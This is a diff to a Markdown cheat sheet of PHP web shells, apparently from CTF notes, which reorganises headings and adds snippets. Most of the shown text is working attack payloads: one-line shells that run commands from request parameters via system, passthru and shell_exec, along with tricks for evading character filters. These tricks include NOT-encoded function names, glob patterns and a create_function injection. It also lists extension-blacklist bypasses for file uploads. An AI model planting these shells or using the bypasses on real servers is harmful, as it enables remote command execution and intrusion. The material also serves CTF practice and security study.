@@ -1,6 +1,6 @@
 # Webshell
-*  [Webshell cheatsheet](#webshell-cheatsheet)  
-*  [Bypass blacklist extension](#bypass-blacklist-extension)  
+*  [PHP Webshell cheatsheet](#php-webshell-cheatsheet)  
+*  [PHP Bypass blacklist extension](#php-bypass-blacklist-extension)  
 *  [SQL inj to webshell](#sql-inj-to-webshell)  
 *  [Don't delete my webshell](#dont-delete-my-webshell)  
 *  [Reverse shell](#reverse-shell)  
@@ -8,7 +8,7 @@
 *  [Privilege escalation](#privilege-escalation)  
 *  [Reference](#reference)
 
-# Webshell cheatsheet
+# PHP Webshell cheatsheet
 ```php
 <?php system('ls'); ?>
 <?php system(ls); ?>
@@ -16,7 +16,6 @@
 <?php system($_GET[1]); ?>
 
 <?php passthru('ls'); ?>
-
 
 // blind
 <?php shell_exec('echo 1>1'); ?>        // 1=echo 1>1
@@ -65,6 +64,17 @@ param=usort(...$_GET);
 // if you can write file e.g. tmp php file
 // you can use characters like ".", or "source" to execute the file
 // . /file will also not print out the result
+
+// dynamically run function
+('phpinfo')();
+(~%8F%97%8F%96%91%99%90)();
+
+// replace with glob
+ls /??/??[^_][A-Z]
+// This means list the file the last two words of whose are not `_` and in range of A to Z. Awesome!!
+
+// old one
+create_function('', 'echo 1;}system(ls);/*')
 ```
 👾How to bypass the length limit：  
 * Build command with filename, then `ls` all thing into shell script [HITCON CTF](http://taiwan.1pwnch.com/web/ctf/2018/02/20/A-tiny-shell/#more)
@@ -89,21 +99,7 @@ From VXCTF2018, I used such shell without English, number, and underline, conten
 From `Meepwn Quals 2018`, I use such shell without text, you can also replace the underline with emoji...  
 [VXCTF2018](https://github.com/shinmao/CTF-writeups/tree/master/vxcon2018)  
 
-
-👾Here comes another advanced problem:  
-```php
-preg_match("/[A-Za-z0-9_$]+/",$a)
-eval($a);
-```  
-I cannot use `$` to create variable anymore, how should I do?  
-In php7.0, there is a new way to run function dynamically such as `('phpinfo')();`, with this way we shorten the length of string. For the limitation on alphanumeric character, we can use **NOT** operator to transform it: `(~%8F%97%8F%96%91%99%90)();`.   
-In addition to new way in php7.0, **using glob** can also help us a lot. `[x]` is also the member of Linux glob and we can use it just like regex to target specific file just like following:  
-```php
-ls /??/??[^_][A-Z]
-```  
-This means list the file the last two words of whose are not `_` and in range of A to Z. Awesome!!
-
-# Bypass blacklist extension  
+# PHP Bypass blacklist extension  
 [服务器针对文件的解析漏洞汇总](https://mp.weixin.qq.com/s/f0y_AjRtc4NjEqeJe6cPhw)  
 In addition to `.php`，with regex in conf:  
 * `.php3`  
